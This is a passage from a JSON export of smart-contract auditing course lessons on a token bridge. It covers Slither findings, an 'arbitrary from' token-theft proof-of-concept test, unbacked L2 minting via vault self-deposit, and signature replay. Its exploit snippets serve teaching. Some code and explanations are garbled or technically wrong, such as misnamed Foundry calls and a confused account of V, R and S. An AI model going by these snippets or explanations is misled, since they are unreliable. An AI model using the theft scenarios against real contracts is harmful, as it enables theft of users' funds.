technology.\n\nOnwards, to a more secure and transparent future.\n",
          "updates": []
        },
        {
          "lessonId": "0fe0657b-cb48-4847-9ed2-8ac6af842ccc",
          "number": 17,
          "title": "Recon Continued",
          "slug": "recon-continued",
          "folderName": "17-recon-continued",
          "description": "",
          "duration": 6,
          "videoUrl": "k6II2HndqksTgobKwPIsL4WuLGwgNvULr00YCkpSmgGE",
          "rawMarkdownUrl": "/routes/security/7-bridges/17-recon-continued/+page.md",
          "markdownContent": "---\ntitle: Recon (continued)\n---\n\n\n\n---\n\n# Decrypting OpenZeppelin's ECDSA Utility Library: An In-Depth Look\n\nIn the vast world of smart contracts, a significant part of understanding how everything works involves understanding Elliptic Curve Digital Signature Algorithm (ECDSA) operations. ECDSA is crucial in secure data transactions in these systems. In this article, we will delve deep into OpenZeppelin's ECDSA assembly code, dissecting its content and functions.\n\n## Understanding ECDSA and OpenZeppelin\n\nECDSA and related technologies help sign and validate data. OpenZeppelin is a comprehensive utility library that provides a plethora of functions to cater to these needs. The given transcript discusses two Ethereum functions written in assembly.\n\n> \"These are all basically ways to help sign and validate data. And this is important for us for reasons you'll see in a bit.\"\n\nFollowing this, we have the ECDSA library, sourced from OpenZeppelin, which focuses on elliptical curve digital signature algorithm operations.\n\n## ECDSA Implementation: Try Recover Function\n\nAs we progress further into the script, we encounter another core utility `Try Recover`. This function extracts the signature constituents `R`, `S` and `V`â€” the value components of the signature all housed in a signature with length 65. An understanding of how `Try Recover` operates is significant in achieving signatures and verifications.\n\n![](https://cdn.videotap.com/Groo7EeK5U7DGEFAK2UT-131.57.png)\n\nThe `Try Recover` function retrieves the address responsible for signing a hashed message with a signature or an error, should that arise.\n\n## L One Vault &amp; Signatory Examples\n\nFollowing this, we introduce L One Vault. As part of subsequent steps, we will take you through some signing examples and elaborate on the ins-and-outs of signing.\n\nIf you're not too familiar with signing or cryptography, I recommend `ChatGPT`.\n\n## Deep Diving into the L One Boss Bridge\n\nThe `L1BossBridge` contract uses several features, including Safe ERC20, to process ERC20 tokens smoothly. A feature of this contract is that it deals with only a single tokenâ€” `L1Token.sol`.\n\n![](https://cdn.videotap.com/IbRV6yoOBBUIBRWA1Ic2-191.37.png)\n\nThe contract also incorporates a deposit limit mechanism that restricts the number of tokens one can deposit. It operates on principles which allow one bridge per token and one vault per token.\n\n```javascript\n// Immutable vault and token declaration\nIERC20 public immutable token;\nL1Vault public immutable vault;\n```\n\n![](https://cdn.videotap.com/0eRk64LOa0VdtxK4nKoF-227.25.png)\n\nTo facilitate token movement from L1 to L2, certain user accounts are distinguished as signers. The contract also incorporates event triggers and error handling mechanisms to manage prospective situations effectively.\n\n## Contract Approval and Miscellaneous Functions\n\nAnother key feature to note here is the `vault.approveTo` function where the `L1BossBridge` provides max withdrawal power and approves ERC20s inside the vault.\n\n```javascript\n// Vault Approval to handle withdrawals\nvault.approveTo(address(this), type(uint256).max);\n```\n\nIn addition to these, there are more, straightforward functions like `pause` and `unpause` that can halt and resume contract processes.\n\nFinally, the functionality to set signers is available to the owner only. There is also a provision for disabling an account, prompting necessary questions about handling situations where an account is disabled mid-process.\n\n## Conclusion\n\nThrough this exploration, we see the ECDSA utility library's vast potential, specifically OpenZeppelin's library. Not only does it allow for more effective and streamlined worksheet functions within the Ethereum environment, but it also provides a window into secure transactions in the blockchain world.\n\nRemember, just as the speaker in the transcript alluded, there might be bugs related to signatures, so consider delving into these libraries and try deconstructing them yourself to foster your understanding of how they work.\n",
          "updates": []
        },
        {
          "lessonId": "bd0cfce8-5121-4244-8dfa-a76a04d30a38",
          "number": 18,
          "title": "depositTokenToL2",
          "slug": "deposit-token",
          "folderName": "18-deposit-token",
          "description": "",
          "duration": 2,
          "videoUrl": "I009kVxdv1EopfnFCnpgvb84Z00gxgx8dYaxWxF2CCqxI",
          "rawMarkdownUrl": "/routes/security/7-bridges/18-deposit-token/+page.md",
          "markdownContent": "---\ntitle: depositTokenToL2\n---\n\n\n\n---\n\n# Understanding the depositTokenToL2 function\n\nIn this blog post, we delve into an essential part of blockchain contract management, especially in relation to the Layer 2 (L2) scaling solutions. One exciting function that facilitates these activities is the `depositTokenToL2` function. It operates in a decentralized environment, orchestrating transactions by locking tokens in the vault and triggering relevant events.\n\n![](https://cdn.videotap.com/pfxr2xqJnxlfGXz1ojht-5.66.png)\n\nThis entry aims at delivering a detailed commentary on how this function works, how to utilize it, and why it is an integral cog in dApp operations.\n\n## An Overview of `depositTokenToL2` Function\n\nThis function is a fundamental aspect of L2 operation. When you call `depositTokenToL2`, there are nodes in waiting to listen and process it, subsequently unlocking the tokens on the L2. This unlocking initiates the minting process on the L2, which is an essential part of the centralized process of the blockchain operation facilitated by this function.\n\nIn simpler terms, it's like we have built a lock (a vault) and unlocked it with a specially designed key (the L2 minting process).\n\nIt's essential to note the three parameters of this function:\n\n1. `from`â€“ the address of the user depositing the tokens\n2. `L2 recipient` â€“ the address of the user receiving the tokens on the L2\n3. `amount` â€“ the value of tokens to deposit.\n\nSpecifically, the function accepts these parameters when the system is not paused, adhering to the condition that the sum of `balance(address(vault))` and `amount` must not exceed the deposit limit.\n\n> This function has a limit of 100,000 tokens. This means you can only have a maximum of 100,000 tokens on the Layer 2 network at any given time.\n\nThe function attains token safety through a transfer to the vault's address, scaling the stipulated amount per the deposit limit.\n\n![](https://cdn.videotap.com/VZtxKixeFPCh2aosAGVO-59.4.png)\n\n## The Importance of Emitted Events\n\nThis function's operation is not complete without an integral event emission: the deposit and unlock events.\n\nThese events, if configured correctly, send vital signals to an off-chain service; hence careful attention must be paid to them when coding or interpreting what this function does.\n\nThe events essentially carry these parameters: `from`, `to`, and `amount`. An off-chain service awaits and listens for these events to facilitate the unlocking of tokens on the L2.\n\nWhile this might seem a tad complex, it can be visualized as a messaging system. The function sends messages (events) that inform the system of where it is time to unlock the tokens on L2.\n\n```js\n// Example of the function parameters in solidity\nfunction depositTokenToL2 (address from, address L2Recipient, uint256 amount) external {/* function body*/}\n```\n\n## Wrapping Up\n\nThe `depositTokenToL2` function, with its event emissions and token transfers, is a crucial part of the blockchain's L2 operations. Understanding the principles of such a function can aid anyone on their journey to mastering blockchain contracts and their integration with L2 solutions.\n\nGet familiar with this type of process and continue your exploration in the vast yet thrilling world of blockchain technology.\n",
          "updates": []
        },
        {
          "lessonId": "730a802e-91db-47c4-b9c1-7abdc6fd7e0e",
          "number": 19,
          "title": "Exploit: Arbitrary From",
          "slug": "arbitrary",
          "folderName": "19-arbitrary",
          "description": "",
          "duration": 3,
          "videoUrl": "9bsX7eSOMPhvP9rnvXqx01pX9OeirAfJDT00BxwitEQwk",
          "rawMarkdownUrl": "/routes/security/7-bridges/19-arbitrary/+page.md",
          "markdownContent": "---\ntitle: Exploit - Arbitrary \"from\" allows users to steal tokens\n---\n\n\n\n---\n\n# Nail-biting Moments with Slither: Uncovering Critical ERC20 Vulnerabilities\n\nHey You! Welcome back! In this post, we'll dig into the enlightening world of Slither, our good friend from [Trail of Bits](https://trailofbits.com/). It is well-equipped to unearth potential code vulnerabilities, and guess what, we've stumbled upon a dicey one! Exciting, right? Buckle up, let's dive in.\n\n## The Problem Unveil\n\nSo, revisiting where we left off, we managed to arrive at a critical point at our function with the help of Slither. Quite the Sherlock, isn't it? Well, let me just relay the discovered issue. We discovered the issue with the 'bossbridge deposit tokens to l2' which utilizes 'arbitrary from in transfer from'. Sounds gibberish, right? Let's decode it.\n\nThe issue pops up when a detection is made that \"message sender\" is not used in 'from in transfer from'. Don't worry, I will walk you through an exploit scenario for clarity (You wouldn't feel good if we don't decode it, and you know it!).\n\n## The Exploit Scenario\n\nConsider our characters, Alice and Bob. Alice approves her ERC20 tokens to be spent by the contract. Enter a malicious entity, Bob, who utilizes this opportunity to call on the contract and set Alice's address as the '`from`' parameter in 'transfer from'.\n\nCan you guess what happens next?\n\n> 'Bob takes off with Alice's hard-earned tokens owing to the contract permission established by Alice.'\n\nPretty severe, isn't it? This just started becoming more interesting than an Agatha Christie novel!\n\n## The Vulnerability In-Depth\n\nLet's try to visualize this scenario. We have Alice, setting off to perform a transaction after calling '`approve of token to bridge`.' Bob, the opportunist, notices this and decides to make his move. He calls '`depositTokensToL2`', all the while using Alice's address for the '`L2`' recipient, which would now be Bob himself. He sets the amount as all her money (sounds like pure evil!). Alice, unsuspecting, has approved this contract, thus allowing Bob's call to pass.\n\nThis would enable the transfer of all Alice's money to Bob on layer two. A chilling scenario to envision!\n\n## Slither - The Hero Unseen\n\nIf it wasn't for Slither grabbing hold of this at audit, the consequent results would be devastating. Figuring out the severity and impact, it's evidently high - Alice would be losing all her tokens to Bob. Depicting the likelihood reveals another elevated risk - this event can transpire anytime Alice calls 'approve'. Consequently, things are looking upwards of 'super high'. While some may tag this as 'crit', we can unanimously agree on labeling it as a 'high audit' critical issue.\n\n_A critical excerpt from Slither's find - \"If a user approves the bridge, any other user can steal their funds\"._ Quite hair-raising, isn't it? It's an unintended consequence stemming from trust in contracts â€” certainly not a scenario we envision.\n\n## Crafting a Proof of Code\n\nAfter such a thrilling ride, let's take a moment to breathe and give a thought to envisaging the proof of code for our discovery.\n\nStick around for the next part where we dive deep into writing a foolproof, high-safety code, ensuring vulnerabilities like this are effectively mitigated.\n\nWith this, weâ€™re signing off for now, continue staying curious and happy coding!\\\\\n",
          "updates": []
        },
        {
          "lessonId": "96c18ccd-ac6e-466d-96de-d03f565fcd68",
          "number": 20,
          "title": "Arbitrary From: Poc",
          "slug": "arbitrary-poc",
          "folderName": "20-arbitrary-poc",
          "description": "",
          "duration": 4,
          "videoUrl": "tjGKINP7sYzrOQSXpLV1bru9aYtRVdMJ6ynAun56KxI",
          "rawMarkdownUrl": "/routes/security/7-bridges/20-arbitrary-poc/+page.md",
          "markdownContent": "---\ntitle: Arbitrary POC\n---\n\n\n\n---\n\n# Testing Token Movement In Solidity\n\nIn this blog post, we will delve into a test suite in Solidity, focusing on testing the movement of approved tokens from one user to another. By simulating a situation where a malicious actor can swoop in and steal tokens, we will unearth potential vulnerabilities and show how to spot a high-severity bug with a tool like Slither.\n\n## Writing A Test Suite Function\n\nLet us begin by scrolling down to our current test harness. Our primary objective is to pen a new test suite function; we will adopt the name `testCanMoveApprovedTokensOfOtherUsers` for this function. Our mission is to verify an occurrence â€“ the actual transfer or move of tokens from one user to another.\n\nTo achieve this, we will repurpose some sections of our existing test suite.\n\n![](https://cdn.videotap.com/kSIFNqF1jGk1jsDF3enL-24.57.png)\n\nWithin our current test suite, we have entities such as `user`, `deployer`, `operator`, `token`, `tokenBridge`, and `vault`. We also have a user account named Alice, tagged in this context as 'poor Alice'.\n\n## Approving Tokens For Transfer\n\nFirst, Alice has to approve the `tokenBridge` to move her tokens to Layer 2. She will just use the L1 Token object (described in code as `L1Token`) and call the `approve` method, passing in the `tokenBridgeâ€™s` address as well as the maximum token number, expressed as `uint256.max`.\n\n```js\nVM.prank(Alice);\nL1Token.approve(addressTokenBridge, uint256.max);\n```\n\n![](https://cdn.videotap.com/u94ZnNK43eS6i6Y9HY71-58.98.png)\n\n## Defining A Malicious Actor\n\nAfter Alice has approved the Token Bridge to lawfully move her tokens, we introduce 'Bob', who maliciously swoops in to steal and deposit all of Alice's tokens on Layer 2. To do this, we first need to obtain the token balance of Alice.\n\n```js\nuint256 depositAmount = Token.balanceOf(userAlice);\n```\n\nWe now need to create an address for our mischief-maker, Bob. Assuming Bob's address as `attackerAddress`, we start a prank with this address and make Bob execute a `depositTokensToL2` call.\n\n```js\naddress attackerAddress = make.addr(attacker);\nvm.startPrank(attackerAddress);\n```\n\nNow, Bob can steal Alice's tokens by depositing them into his own account on Layer 2.\n\n```js\nTokenBridge.depositTokensToL2(userAlice, attackerAddress, depositAmount);\n```\n\n## Ensuring Data Integrity With Emit\n\nIn this scenario, we need to emit an event since the tokens are being locked into the `vault`. Emitting the correct details in this event serves an important role as the off-chain service, which listens to these events, triggers the unlocking on Layer 2.\n\n```js\nvm.expectEmit(\n  addressTokenBridge,\n  emitDeposit(userAlice, attackerAddress, depositAmount)\n);\n```\n\n## Asserting The State\n\nNow, we make assertions to verify that the token balance of Alice is zero and the token vault's balance equals the `depositAmount`.\n\n```js\nassertEqual(Token.balanceOf(userAlice), 0);\nassertEqual(Token.balanceOf(addressVault), depositAmount);\n```\n\nOnce the verification process is complete, we stop the prank.\n\n```js\nvm.stopPrank();\n```\n\n## Verifying The Test Case\n\nOn running the test suit, we observe that the test case succeeds, indicating that there's a high-severity bug - easy pickings for a malicious actor.\n\nThis explorative approach reveals how even advanced code bases can fall prey to serious issues, and tools like Slither prove indispensable in identifying them. So, let's continue analyzing with Slither and see what other 'goodies' we can find!\n\n> \"Even in some of these more advanced code bases, tools like Slither can find really good issues. So thank you, Slither. Let's keep walking down, Slither. Let's see what other goodies are in here. This turned out to be a high.\"\n",
          "updates": []
        },
        {
          "lessonId": "20c4bf89-7c19-49f0-a902-420d06188892",
          "number": 21,
          "title": "Recon Continued (again)",
          "slug": "recon-continued-again",
          "folderName": "21-recon-continued-again",
          "description": "",
          "duration": 5,
          "videoUrl": "6fX7WXRImMzawIVLKIMwGITCyB8eGpZbXlKy01kAWD5I",
          "rawMarkdownUrl": "/routes/security/7-bridges/21-recon-continued-again/+page.md",
          "markdownContent": "---\ntitle: Recon Continued Again\n---\n\n\n\n---\n\n# Auditing For Ethereum Vulnerabilities: A Deep Dive\n\nEver felt like unraveling the intricacies of handling vulnerabilities in Ethereum applications? You're at the right place. Let's go ahead and walk you through the eccentric realm of vulnerability handling using the Slither code analysis tool.\n\nBefore proceeding, bear in mind that this journey does not aim to demoralize the workings of Ethereum applications, but to encourage developers to safeguard and optimize them further.\n\n## Unchecked Return Value: Be diligent or Perilous?\n\nMoving along, our next houseguest is the 'approve' function. This method seems to be ignoring its return value. This irregularity, if unchecked, could lead to catastrophic consequences.\n\nOn investigating, Slither reports that while calling the SafeMath `add` method, we aren't storing the resultant sum, rendering the operation meaningless.\n\nWhile this isn't an issue all the time, for a more secure and tight-knit application, we should validate the return values just to make our code robust.\n\nHowever, going by the information at our disposal, it's not a huge dealbreaker. Next time, Slither, next time.\n\n## Zero Check Madness\n\nSlither is back at it again, pointing out the absence of 'zero check'. Fortunately, we had the foresight to check out the README, which states this clearly: they've deliberately omitted 'zero checks' for input validation to preserve some gas. Nice try Slither, but we're covered.\n\n## Navigating The Detectors: Reading Between The Lines\n\nHere's a fun part: handling reentrancy. This essentially implies an external call not followed by a computation, rather it makes an immediate deposit. Let's take a closer look.\n\nWe found that the L1 BossBridge deposit function does decide to deposit tokens without performing a computation, ergo, no effect. With our code set to accept only our L1 token, one without any attached callback functionality, this poses no significant security threat.\n\nDespite this, we nonetheless note it as being preferable to follow CEI (Check-Effects-Interactions).\n\n## The Unerring Eye Of Slither: Red Flags Galore\n\nSlither, understandably, doesn't like assembly instructions and different versions of Solidity being used. All these are valid concerns and necessitate modifications of their own.\n\nThe 'deposit limit' being mutable is a red flag and it should generally be set as a constant.\n\n```js\n//@Audit Info: Deposit Limit Should Be Constant\n```\n\nThis is one of the real and impactful bugs pointed out by our trusty friend, Slither. While it has led us on a merry chase with some informational stuff and a myriad of future functions, it did deliver in the end, which makes for a fantastic learning experience!\n\n## The Future: A Call To Invariance Testing\n\nTake a step back, and soak in everything that's happened. Before we ride off into the sunset, we'd like to urge you to take the future of protecting codebases very seriously, and commit yourself to write stateful fuzzing and invariance test suites.\n\n\"Pause the video right now, try to write down some invariants. Understand what are the invariants, and then write your own fuzzing test suite.\"\n\nSlither and bossbridge have given us some food for thought and armed us with tools to go fearlessly into the world of Ethereum applications. However, always remember: there's always room to explore, learn, and improve.\n\nHappy coding, my friends! Remember, the codebase is not a minefield if you know where the mines are!\n",
          "updates": []
        },
        {
          "lessonId": "491bf2d2-a33f-42fa-b32b-0e20457c4d4a",
          "number": 22,
          "title": "Vault",
          "slug": "vault",
          "folderName": "22-vault",
          "description": "",
          "duration": 4,
          "videoUrl": "g6QF8ql51Gymgf84dIG9bsuRqA6o0082SyAvUogwKbT00",
          "rawMarkdownUrl": "/routes/security/7-bridges/22-vault/+page.md",
          "markdownContent": "---\ntitle: Exploit - Vault can infinite mint unbacked tokens\n---\n\n\n\n---\n\n# A Deeper Dive into the MEV Attack and Uncovering a Major Security Flaw\n\nExciting revelations generally come with a bit of craziness, and today, we bring to you one such incidentâ€”an astonishing vulnerability. At first glance, it appears captivatingly cool, yet incredibly daunting. We reveal a flaw that allows any user to steal funds after the bridge receives approval from someone. This scenario might lead to MEV (Miner Extractable Value) attacks. Intriguing, right? Let's unravel this mystery together.\n\n## Uncovering a Significant Security Threat\n\n![](https://cdn.videotap.com/yngYAVIajAxqq6gSChMU-18.png)\n\nThe perplexing part is when the vault, intending to authenticate the bridge, essentially leads to a chain of apprehensive questions. What happens if the safe haven we call the vault approves the bridge? Does that mean a user can filch funds from the vault? Did we just expose ourselves to another audit? Or is this a 'high'?\n\nWe can't let this issue slide. So, let's explore this further.\n\n## What does Vault's Approval to a Bridge Mean?\n\n```javascript\nfunction testCanTransferFromVaultToVault() {...}\n```\n\nThe vault, as the entity approving the bridge, raises alarming questions. Let's consider a user initiates a transfer from the vault to the attacker. Ambiguously enough, could this process occur for any amount and for any token within the bridge? That would be a disastrous outcome!\n\nOur next step? Writing a test to verify this vulnerability.\n\n## Is There a Limit to Money Minting?\n\n![](https://cdn.videotap.com/bnfWcdfv7XuRYwEfv14a-84.png)\n\nWith our test, we are aiming to transfer from the vault back to itself. When we assert ourselves to be the recipient, the tokenized assets stay within the vaultâ€”this causes an emission of a deposit event from the vault to the recipient on the L2 layer.\n\nHere's where things become startlingly interesting. If the tokens stay within the vault infinitely, could we mint unlimitedly on the L2 layer? Let's try this out.\n\n## Code Implementation\n\nIn the next set of developments, we need to create an attacker.\n\n```javascript\nuint256 vaultBalance = 500 ether;\nminter.mint(address(token), address(vault), vaultBalance);\n```\n\nLet's assume, for simplification, that our vault already holds some currency. In this example, we let it hold 500 ether. To effectively simulate this situation, we can use Foundry's cheat code which gifts our vault with 500 ethers of a particular token.\n\nFollowing this, we need to direct the trigger towards the deposit event function. This function executes when there's self-transference of tokens to the vault.\n\n```javascript\nemit deposit(address(token), address(vault), address(attacker), vaultBalance);\n```\n\nUnderstandably, it sounds a bit nonsensical. Why are we sending it back to ourselves? However, the objective here is to transfer it to the attacker.\n\n```javascript\ntokenbridge.depositToL2(\n  address(token),\n  address(vault),\n  address(attacker),\n  vaultBalance\n);\n```\n\nNow comes the shocker moment! We can ostensibly perform this operation indefinitely because we're continually sending back the tokens to the vault. Do we just stumble upon a way to mint infinite tokens on the L2 layer? Let's validate this.\n\n...\n\nYikes! We indeed did. We've indeed discovered a loophole that allows users to mint tokens on the L2 layer, theoretically, without limitation, irrespective of whether they could withdraw these tokens or not.\n\nThe realization of this potential for creating an unlimited number of tokens flags a significant issue. It's undeniably a vulnerability of high severity. We won't get into a thorough write-up, but the proof of this code's failure is quite evident from this exploration, reminding us of the constant need to stay vigilant in the technology sector.\n",
          "updates": []
        },
        {
          "lessonId": "795f5011-08d2-489f-9d32-5f0216c39885",
          "number": 23,
          "title": "Why are these not the same finding?",
          "slug": "why-not-the-same",
          "folderName": "23-why-not-the-same",
          "description": "",
          "duration": 2,
          "videoUrl": "nDcqp1KrhHtFuotKGO8xpAi35p8iA9PCxsiOkd900c01U",
          "rawMarkdownUrl": "/routes/security/7-bridges/23-why-not-the-same/+page.md",
          "markdownContent": "---\ntitle: OracleUpgradeable.sol (Continued)\n---\n\n\n\n---\n\n# Unraveling the Conundrum: Are They Two Separate Bugs, Or Just One?\n\nWhenever you're delving deep into bug relief, it often becomes a question whether to report similar issues separately or bundle them as one. Well, this blog post seeks to clarify these foggy waters, drawing on a practical example involving two similar software functions. Let's dive in, shall we?\n\n## Dissecting the Problem at Hand\n\nOur situation consists of two seemingly identical problems arising from similar functions. You might be asking, as did one of our colleagues, _why are we reporting these as two separate issues? Aren't they the same issue?_.\n\n![](https://cdn.videotap.com/6gzcQPFB2rgdRBI8JFJa-11.36.png)\n\nFair question, right? After all, it's an essential part of troubleshooting to identify the issues accurately, so we can apply correct fixes and prevent future recurrences. Let's start by understanding the root cause of these bugs to see if they are more distinct than they appear.\n\n### The Root Cause\n\n> \"In every complex problem lies an opportunity to learn.\"\n\nLook closely, and we find that the two bugs have slightly different root causes.\n\n**Bug 1:** The problem here is that after 'someone else' approves, a user can surreptitiously 'steal' their funds. This issue essentially arises from an 'arbitrary send' from another user, which isn't supposed to happen in a robust, secure system.\n\n**Bug 2:** We see that while it deals with 'stealing' as well, the issue isn't strictly similar. The problem here essentially arises from the vault always having maximal approvals. This bug, therefore, isn't solely dependent on the thieving user, but also on the software giving unwarranted permissions.\n\n![](https://cdn.videotap.com/l0gRdGu8ti9QkBOZPlHZ-36.92.png)\n\nYes, you could argue that at their core, these issues do outline a 'similar' root cause. This claim holds some merit after all since both problems involve unauthorized access and fund misappropriation. Still, the dramatic differences in the details could be seen as suggesting two separate bugs.\n\n### An Interesting Conundrum\n\nWe stand before an interesting conundrum in software debugging â€” whether to consider identical root causes with different details as a single bug or multiple. Personally, I find these two bugs intriguingly intricate enough to merit separate reports. Of course, as this is not a hard and fast rule, opinions may differ. There's room for a heated debate here, with Technocrat A claiming they're the same issue and Developer B insisting they're two different things.\n\n### The Result: Two Bugs or One?\n\nPutting aside the scholarly debate on debugging philosophy, in practical terms, we have two problems that necessitate separate solutions. Thus, regardless of their identical core, from our perspective, these remain two separate findings.\n\n![](https://cdn.videotap.com/PtXNrChg21iZ1dkXkyTz-53.96.png)\n\n## And We Are 'Cooking'\n\nIn our world of programming, this is called 'cooking.' We take the raw ingredients (issues) and turn them into tasty dishes (resolved problems).\n\nAre there any other issues lurking beneath the surface? Possibly. For now, though, I think we're in good shape having identified these two intriguing bugs. We've ironed out a major part of our problem-solving journey, leaving potentially two more crucial functions to dissect.\n\nSo what's the lesson here? Bugs always aren't what they seem. And, just as crucially, sometimes they are exactly what they seem. But the beauty of it all lies in the exploration and discovery.\n\nStay tuned in to our coding adventures. Let's see what else we discover along the way. Happy 'cooking'!\n",
          "updates": []
        },
        {
          "lessonId": "c5c88396-a8a2-49a8-922b-845543a3b3aa",
          "number": 24,
          "title": "Recon Continued Again (again)",
          "slug": "recon-again-again",
          "folderName": "24-recon-again-again",
          "description": "",
          "duration": 6,
          "videoUrl": "02uyrS2neealp6yHRU3JEBxzwSEyxbPgSnZcFHcJqraI",
          "rawMarkdownUrl": "/routes/security/7-bridges/24-recon-again-again/+page.md",
          "markdownContent": "---\ntitle: Recon (Continued) Again\n---\n\n\n\n---\n\n# Understanding Token Withdrawal From L2 to L1 in Blockchain\n\nIn this post, we'll be deep diving into a crucial function that is responsible for the withdrawal of tokens from L2 to L1. Along the way, we will demystify some blockchain terminologies like VR and S, and explore how security mechanisms prevent replay attacks.\n\nIn this process, we are going to look into two essential parameters: VR and S, and the address of the user, and then explore the 'send to l one V, R and S' function. We will also dig a little into gasless transactions and encoding some data in various functions.\n\n## Signature: A Safety Net Against Replay Attacks\n\nThe function we will be examining requires what we refer to as \"signature\" - an essential feature to prevent sketchy replay attacks.\n\n```js\n  function withdrawL2(address _l2Token,address _from,address _to,uint256 _amount,uint32 _l1Gas,bytes calldata _data) external returns (bytes memory){}\n```\n\nHere, `_from` works as the address of the user receiving tokens on L1. `_amount` determines the tokens to withdraw, and `data` emits the signature coming from the signed data. This gives us VR and S.\n\n## Embarking on The Token Withdrawal Journey\n\n![](https://cdn.videotap.com/UsY4cL26EFFcQNaxeMa5-118.72.png)\n\nNow, let's walk through the process of withdrawing tokens from L2 to L1. In the function, it's apparent that anyone can initiate a token withdrawal to L1. Let's analyze the step that happens when we call 'send to l1 V, R and S'.\n\n## Signature Verification and Gasless Transactions\n\nTokens are withdrawn from L2 to L1 upon calling 'send to l1 V, R and S.' ABI encoding (a part of signing in Ethereum) is key to our discussion here. It signs the essential message we will verify for authenticity.\n\n> \"Allowing people to call transactions by signature introduces the beneficial feature of gasless transactions, called relays.\"\n\nWithdrawing tokens via signatures brings many benefits, despite it seeming a bit unusual. For instance, it enables gasless transactions, which can help users save on network gas fees.\n\n## Unravelling the sendToL1 'V, R and S' and ECDSA Recover Function\n\nUpon calling `sendToL1`, we come across V, R and S encoded as bytes in the memory message. Let's now delve into the 'ECDSA Recover' to verify the signer.\n\n```js\nfunction recover(bytes32 hash, bytes memory signature)\n```\n\nInvoking 'recover' in the `sendToL1` function gets the function `Try Recover`, which eventually reaches out to the ECDSA recover at the lower part.\n\nIt's quite confusing, but stay with me!\n\nBehind the scene, the private key and the signed message combine to become the input parameters constituting V, R and S. The chain is verifying the message off-chain.\n\n![](https://cdn.videotap.com/VndGsyKD2Q9sT0kYNAIq-217.66.png)\n\nThe highlighted block of code converts the signed message into a designated format. The `ecrecover` and `hashutils twoethereum` play a significant role in this. Afterward, it calls `ECDSA Recover` to verify the signer.\n\nLet the code tickle your curiosity and compel you to inspect it further. So, let's proceed!\n\n## Ensuring Only Authorized 'Signer' Can Operate\n\nThe above block of code facilitates how the V, R and S signer can withdraw tokens from L2 to L1. This flow makes sense â€“only an authorized signer should be able to unlock tokens on L2. Any unauthorized access will cause a total system revert.\n\nThe codes continue to decode the message after verifying the 'signer.'\n\n```js\n  (address target, uint256 value, bytes memory data) = abi.decode(_message, (address, uint256, bytes));\n```\n\nThe system finally performs a low-level call, unlocking the token over here. It uses the 'signer' placed in the target call feature with the determined data. If this is not successful, it reverts again.\n\nHere ends our thorough examination of withdrawing tokens from L2 to L1. It can be complicated but don't sweat it; every blockchain pro started from somewhere! Happy coding!\n",
          "updates": []
        },
        {
          "lessonId": "f751fc12-ba83-440b-89aa-c9f884a04542",
          "number": 25,
          "title": "Exploit: Signature Replay",
          "slug": "exploit-replay",
          "folderName": "25-exploit-replay",
          "description": "",
          "duration": 1,
          "videoUrl": "kGbJsEKbl8Jg0142FtHkcPOKZJ3KOU2J1al7401o1dVD00",
          "rawMarkdownUrl": "/routes/security/7-bridges/25-exploit-replay/+page.md",
          "markdownContent": "---\ntitle: Exploit - Signature Replay Introduction\n---\n\n\n\n---\n\n# Deep Dive Into Blockchain Security: Unraveling possible threats.\n\nOne of the most critical aspects of blockchain technologies is the security of transactions. From initial transaction construction to the validation and final verification, every step needs to be sealed tight against possible leaks and malicious hacks.\n\n![](https://cdn.videotap.com/U6sIP6ZAYI2aZNSWp4tF-3.87.png)\n\nThere is an exciting operation happening here, particularly the part where cryptography plays an integral role in securing these transactions. Yet, can we say with utter certainty that this operation is foolproof? Let us explore this in detail.\n\n## Role of Cryptography in Blockchain Security\n\nPrimarily, a piece of cryptographic math, or simply cryptomath, is used to generate a digital signer, or simply, Signer. The very next step is to verify that this Signer in question is legitimate. Primarily, this is designed to prevent unauthorized users or hackers from tampering with the information or modifying it to their advantage.\n\nBut the crucial question is, is there a way for some other random user, possibly with malicious intent, to bypass this system and pose as the Signer?\n\nTheoretically, letâ€™s analyze this process in detail.\n\n### Examining the Signature Placement\n\nThink about it like this:\n\nWhen the Verification Result (VR) and Signature (S) are placed on the blockchain, they form what is essentially a 'signature.' Once the signature is up on-chain, it becomes universally visible. It's comparable to a signed message that's been broadcasted across the network.\n\nAs a user, you wonâ€™t have access to the private key, but the signed message is right there, quite visible. Still, unless you misuse this, everything is as safe as it should be, correct?\n\nHere's where things start to become interesting.\n\nConsider this scenario:\n\n_What if another user decided to send the exact same signed message?_\n\nIt does sound a bit nerve-wracking, doesnâ€™t it?\n\n```js\nif (message.signature === duplicated_message.signature) {\n  console.log(\"Threat detected\");\n}\n```\n\nUpon reflection, this certain aspect reveals the possibility of a potential security breach. An unauthorized user might mimic a legitimate sender by duplicating the signature, consequently causing a remarkably serious issue.\n\n> **Blockquote**: \"He who knows only his side of the case, knows little.\" - John Stuart Mill\n\n## The Vulnerability Verdict: Is Blockchain Security Assured?\n\nSo, putting it bluntly, could this be the Achilles Heel in our otherwise 'unbreakable' blockchain security? It indeed could be! As developers and engineers passionate about blockchain technology, it's critical that we assess and address every overlooked vulnerability. In this context, considering the possibility of a duplicate signed message on-chain could point us to areas of our system that require more robust fortification.\n\nEngaging in such analytical exploration is not just about identifying problems. It's also about fostering a culture of improvement and evolution in the world of blockchain technology. With every obstacle we overcome, we not only make our systems safer; we also contribute to the overall growth and credibility of blockchain technology.\n\n![](https://cdn.videotap.com/0t4sBJFtbzZLfqeahsX4-54.13.png)\n\nIn conclusion, blockchain security depends heavily on its cryptographic standards. Even though the possibility of a breach might be low, as technology progresses and attackers become more sophisticated, possibilities might become realities. Therefore, remaining informed, prepared, and proactive is the key to staying one step ahead!\n",
          "updates": []
        },
        {
          "lessonId": "2068428c-986b-408b-a3d9-afd659319258",
          "number": 26,
          "title": "Signature Replay: Minimizd",
          "slug": "replay-minimizd",
          "folderName": "26-replay-minimizd",
          "description": "",
          "duration": 2,
          "videoUrl": "HWlULSjWO2Be401V8KlE02sJ2XGUnvQYXULzRyVOav5nI",
          "rawMarkdownUrl": "/routes/security/7-bridges/26-replay-minimizd/+page.md",
